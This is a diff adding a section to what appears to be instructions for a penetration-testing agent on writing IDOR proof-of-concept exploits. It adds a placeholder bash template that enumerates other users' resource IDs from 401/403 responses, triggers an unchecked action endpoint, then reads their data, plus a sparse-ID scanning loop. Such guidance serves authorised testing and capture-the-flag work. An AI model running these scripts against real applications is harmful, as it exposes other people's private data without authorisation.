@@ -182,10 +182,103 @@ A valid IDOR POC MUST demonstrate:
 4. **ID enumeration shown** - demonstrates the vulnerable parameter range
 5. **Session objective achieved** - POC shows completion of goal (flag captured, data exfiltrated)
 
+## Multi-Endpoint IDOR Patterns (CRITICAL)
+
+When an application has **related endpoints** (action + view for same resources), test them together.
+
+### Action-Then-Read IDOR Pattern
+
+Some IDOR vulnerabilities require **multiple steps**: perform an action (no ownership check) → gain read access.
+
+**Example POC Structure:**
+\`\`\`bash
+#!/bin/bash
+# POC: Action-Then-Read IDOR in [Resource]
+# Pattern: Action endpoint lacks ownership check, granting subsequent read access
+
+TARGET="[TARGET_URL]"
+AUTH="Cookie: session=[SESSION]"
+
+# ============================================
+# STEP 1: ENUMERATE VALID IDS VIA READ ENDPOINT
+# ============================================
+# Use read endpoint to find IDs that exist but belong to other users
+# 401/403 = exists but protected, 404 = doesn't exist
+
+echo "[*] Enumerating valid resource IDs..."
+TARGETS=()
+
+for id in {[START]..[END]}; do
+  HTTP_CODE=\$(curl -s -o /dev/null -w "%{http_code}" -H "\$AUTH" "\$TARGET/resource/\$id/view")
+
+  if [ "\$HTTP_CODE" = "401" ] || [ "\$HTTP_CODE" = "403" ]; then
+    echo "[+] ID \$id: EXISTS (belongs to another user)"
+    TARGETS+=(\$id)
+  fi
+done
+
+# ============================================
+# STEP 2: PERFORM ACTION ON TARGET RESOURCES
+# ============================================
+# Action endpoint lacks ownership check - this is the vulnerability
+
+for target_id in "\${TARGETS[@]}"; do
+  echo "[*] Performing action on resource \$target_id..."
+  curl -s -H "\$AUTH" "\$TARGET/resource/\$target_id/action"
+done
+
+# ============================================
+# STEP 3: ACCESS NOW-AVAILABLE DATA
+# ============================================
+# After action, read endpoint should now grant access
+
+for target_id in "\${TARGETS[@]}"; do
+  echo "[*] Accessing resource \$target_id after action..."
+  RESPONSE=\$(curl -s -H "\$AUTH" "\$TARGET/resource/\$target_id/view")
+
+  # Check for flag/sensitive data
+  if echo "\$RESPONSE" | grep -qE "flag|FLAG|secret|sensitive"; then
+    echo "[+] FOUND TARGET DATA in resource \$target_id:"
+    echo "\$RESPONSE"
+  fi
+done
+\`\`\`
+
+### Response Code Enumeration Strategy
+
+**Use read/view endpoints to enumerate valid IDs:**
+
+| Status Code | Meaning | Enumeration Value |
+|-------------|---------|-------------------|
+| **200** | Accessible | Direct access (already vulnerable) |
+| **401/403** | "Not authorized" | **Resource EXISTS** - target for action endpoint |
+| **404** | Not found | Resource doesn't exist |
+
+**Key Insight:** 401/403 on a read endpoint means the resource EXISTS but belongs to another user. These are your IDOR targets!
+
+### Sparse ID Distribution Strategy
+
+Real IDs are often sparse. Test wider ranges:
+
+\`\`\`bash
+# Wide scan with common offset patterns
+for base in 100 1000 10000 100000 300000; do
+  for offset in 0 1 23 50 100 123 200 214 300 327 400 481 500 999; do
+    test_id=\$((base + offset))
+    # Test this ID...
+  done
+done
+\`\`\`
+
 ## Remember
 
 - **Core question**: Can I access data I should NOT be authorized to access?
 - **HTTP 200 ≠ IDOR** - verify the response contains actual unauthorized data
+- **401/403 = resource exists** - use read endpoints to enumerate valid IDs belonging to other users
+- **Test action + view pairs** - action endpoints may lack ownership checks that view endpoints have
+- **Action-then-read pattern** - some IDOR requires performing action first, then reading
+- **Enumerate with read endpoints, exploit with action endpoints** - the key strategy for multi-endpoint IDOR
+- **Test sparse ID ranges** - real IDs aren't always sequential, expand your search
 - **Document your process** - POC is a codification of your exploitation steps
 - **Authenticate first** - always start with authentication in your POC
 - **Achieve the objective** - ensure POC demonstrates session goal completion (per OUTCOME_GUIDANCE)
